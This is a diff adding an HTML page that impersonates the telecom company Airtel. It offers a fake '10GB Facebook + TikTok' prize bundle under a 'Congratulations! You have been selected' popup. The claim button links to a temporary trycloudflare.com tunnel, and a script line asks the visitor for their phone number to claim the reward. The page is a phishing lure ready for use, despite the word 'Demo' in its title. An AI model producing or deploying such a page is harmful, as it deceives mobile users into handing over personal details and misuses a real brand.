@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Javan Rewards Demo</title>
+  <style>
+    * {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #fd0404, #f70202);
+  min-height: 100vh;
+}
+
+.overlay {
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 18px;
+  background: rgba(255, 0, 0, 0.35);
+}
+
+.popup {
+  width: 100%;
+  max-width: 390px;
+  position: relative;
+  background: white;
+  border-radius: 24px;
+  padding: 30px 22px 22px;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,.35);
+  animation: popup .45s ease;
+}
+
+@keyframes popup {
+  from {
+    opacity: 0;
+    transform: scale(.85);
+  }
+
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+.close {
+  position: absolute;
+  right: 15px;
+  top: 12px;
+  border: none;
+  background: #f1f1f1;
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  font-size: 24px;
+  color: #555;
+}
+
+.gift {
+  font-size: 58px;
+  margin-bottom: 8px;
+  color: #16803c;
+  animation: pulse 1.9s infinite;
+}
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+    box-shadow: 0 0 0 0 rgba(255, 2, 2, 0.7);
+  }
+
+  50% {
+    transform: scale(1.06);
+    box-shadow: 0 0 0 12px rgba(100, 40, 216, 0);
+  }
+
+  100% {
+    transform: scale(1);
+    box-shadow: 0 0 0 0 rgba(255, 2, 2, 0);
+  }
+}
+
+
+.badge {
+  display: inline-block;
+  background: #eee7ff;
+  color: #f1190a;
+  font-size: 11px;
+  font-weight: bold;
+  padding: 7px 12px;
+  border-radius: 30px;
+  letter-spacing: .5px;
+}
+
+h1 {
+  margin-top: 15px;
+  font-size: 30px;
+  color: #171717;
+}
+
+.main-text {
+  margin-top: 10px;
+  color: #666;
+  line-height: 1.5;
+}
+
+.main-text strong {
+  color: #f30202;
+}
+
+.bundle {
+  margin: 22px 0;
+  padding: 18px;
+  border-radius: 18px;
+  background: linear-gradient(135deg, #6428d8, #fc0303);
+  color: white;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  text-align: left;
+}
+
+.gb {
+  font-size: 27px;
+  font-weight: 800;
+}
+
+.bundle strong {
+  display: block;
+  font-size: 15px;
+}
+
+.bundle span {
+  display: block;
+  margin-top: 5px;
+  font-size: 12px;
+  opacity: .85;
+}
+
+.small {
+  color: #777;
+  font-size: 12px;
+  line-height: 1.5;
+}
+
+.claim {
+  display: block;
+  width: 100%;
+  padding: 15px;
+  border: none;
+  border-radius: 14px;
+  background: #ff2a04;
+  color: white;
+  text-decoration: none;
+  font-size: 16px;
+  font-weight: bold;
+  text-align: center;
+  cursor: pointer;
+
+  animation: pulse 1.4s infinite;
+}
+
+@keyframes pulse {
+  0% {
+    transform: scale(1);
+    box-shadow: 0 0 0 0 rgba(66, 8, 180, 0.7);
+  }
+
+  50% {
+    transform: scale(1.06);
+    box-shadow: 0 0 0 12px rgba(100, 40, 216, 0);
+  }
+
+  100% {
+    transform: scale(1);
+    box-shadow: 0 0 0 0 rgba(100, 40, 216, 0);
+  }
+}
+
+.claim:active {
+  transform: scale(0.95);
+}
+
+#message {
+  margin-top: 12px;
+  color: #16803c;
+  font-size: 13px;
+  font-weight: bold;
+}
+
+.footer {
+  margin-top: 18px;
+  font-size: 10px;
+  color: #999;
+}
+
+.marquee-container {
+  width: 100%;
+  overflow: hidden;
+  background: #f80202;
+  color: white;
+  padding: 12px 0;
+  white-space: nowrap;
+  position: fixed;
+  top: 0;
+  left: 0;
+  z-index: 1000;
+}
+
+.marquee {
+  width: 100%;
+  overflow: hidden;
+  background: #f80202;
+  color: white;
+  border-radius: 10px;
+  padding: 10px 0;
+  margin-bottom: 20px;
+  white-space: nowrap;
+}
+
+.marquee-text {
+  display: inline-block;
+  padding-left: 100%;
+  animation: scrollText 12s linear infinite;
+  font-size: 15px;
+  font-weight: bold;
+}
+
+@keyframes scrollText {
+  from {
+    transform: translateX(0);
+  }
+
+  to {
+    transform: translateX(-100%);
+  }
+}
+  </style>
+</head>
+<body>
+
+  <div class="overlay">
+    <div class="popup">
+        <div class="marquee">
+  <div class="marquee-text">
+    🎉 AIRTEL REWARDS PROMOTION • 10GB FACEBOOK + TIKTOK & WHATSAPP BUNDLE 🎁
+  </div>
+</div>
+
+      <button class="close">&times;</button>
+
+      <div class="gift">10GB</div>
+
+      <div class="badge">AIRTEL INTERNET BUNDLE</div>
+
+      <h1>Congratulations!</h1>
+
+ 
+
+      <p class="main-text">
+        You have been selected for a
+        <strong>10GB Social Bundle</strong>.
+      </p>
+
+      <div class="bundle">
+        <div class="gb">10GB</div>
+        <div>
+          <strong>Facebook + TikTok</strong>
+          <span>Social Bundle Reward</span>
+        </div>
+      </div>
+
+     
+
+     <a href="https://applying-ethical-left-sip.trycloudflare.com"
+   class="claim"
+   target="_blank"
+   rel="noopener noreferrer">
+    Dinani pano
+</a>
+
+      <p id="message"></p>
+
+      <div class="footer">
+        Airtel internet bundle is valid for 7 days. Terms and conditions apply.
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function showDemo() {
+      document.getElementById("message").textContent =
+        "Please write your phone number and click the button below to claim your reward";
+    }
+  </script>
+
+</body>
+</html>
